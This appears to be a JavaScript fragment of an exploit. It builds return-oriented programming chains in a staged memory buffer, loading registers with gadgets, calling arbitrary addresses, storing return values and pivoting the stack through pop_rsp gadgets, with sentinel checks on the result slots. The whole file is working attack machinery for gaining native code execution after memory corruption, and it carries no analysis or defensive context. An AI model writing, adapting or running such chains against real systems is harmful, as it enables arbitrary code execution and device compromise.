//#region Constants
const ROP_H = 0x4000;
const ROP_LIMIT = ROP_H + 0x1800;
const PIVOT_BUF = 0x380;
const PIVOT_BUF_ARG = 0x388;
const CHAIN_SENTINEL_LO = 0xdeadbeef;
const CHAIN_SENTINEL_HI = 0xdeadbeef;
//#endregion

//#region Chain
function mount_pivot(stage, targets, c1, cursor) {
  if (ROP_H + cursor > ROP_LIMIT) throw new Error('ROP_TOO_LONG|' + cursor);

  stage_write64(stage_view, PIVOT_BUF, targets.pop_rsp);
  stage_write64(stage_view, PIVOT_BUF_ARG, stage.backing + ROP_H);
  stage_write64(stage_view, STAGE_K + 8, stage.backing + PIVOT_BUF);
  stage_write64(stage_view, STAGE_K + 16, targets.pivot_target);
}

function build_call_sequence(stage, targets, calls, c1, results) {
  let cursor = 0;
  const emit = (q) => {
    stage_write64(stage_view, ROP_H + cursor, q);
    cursor += 8;
  };
  const emit_pair = (gadget, value) => {
    emit(gadget);
    emit(value);
  };
  const regs = [targets.pop_rdi, targets.pop_rsi, targets.pop_rdx, targets.pop_rcx, targets.pop_r8, targets.pop_r9];

  for (let index = 0; index < calls.length; index++) {
    const call = calls[index];
    emit_pair(targets.pop_rax, to_bigint(call.rax === undefined ? 0 : call.rax));
    for (let i = 0; i < regs.length; i++) emit_pair(regs[i], to_bigint(call.args && call.args[i] !== undefined ? call.args[i] : 0));
    emit(to_bigint(call.address));
    if (results) {
      emit_pair(targets.pop_rdi, stage.backing + results + index * 8);
      emit(targets.store_rax);
    }
  }

  emit_pair(targets.pop_rsp, c1);
  mount_pivot(stage, targets, c1, cursor);
}

function build_call_chain(stage, targets, address, args, c1, slot, rax, restore = 0) {
  let cursor = 0;
  const emit = (q) => {
    stage_write64(stage_view, ROP_H + cursor, q);
    cursor += 8;
  };
  const emit_pair = (gadget, value) => {
    emit(gadget);
    emit(value);
  };

  emit_pair(targets.pop_rax, to_bigint(rax ?? 0));

  const regs = [targets.pop_rdi, targets.pop_rsi, targets.pop_rdx, targets.pop_rcx, targets.pop_r8, targets.pop_r9];
  for (let i = 0; i < regs.length; i++) emit_pair(regs[i], to_bigint(args[i] ?? 0));

  emit(to_bigint(address));
  emit_pair(targets.pop_rdi, stage.backing + slot);
  emit(targets.store_rax);
  if (restore) {
    emit_pair(targets.pop_rax, to_bigint(restore.value));
    emit_pair(targets.pop_rdi, to_bigint(restore.slot));
    emit(targets.store_rax);
  }
  emit_pair(targets.pop_rsp, c1);
  mount_pivot(stage, targets, c1, cursor);
}
//#endregion

//#region Result slot
function seed_result(offset) {
  stage_write32(stage_view, offset, CHAIN_SENTINEL_LO);
  stage_write32(stage_view, offset + 4, CHAIN_SENTINEL_HI);
}

function result_is_seeded(offset) {
  return stage_view.getUint32(offset, true) === CHAIN_SENTINEL_LO && stage_view.getUint32(offset + 4, true) === CHAIN_SENTINEL_HI;
}
//#endregion
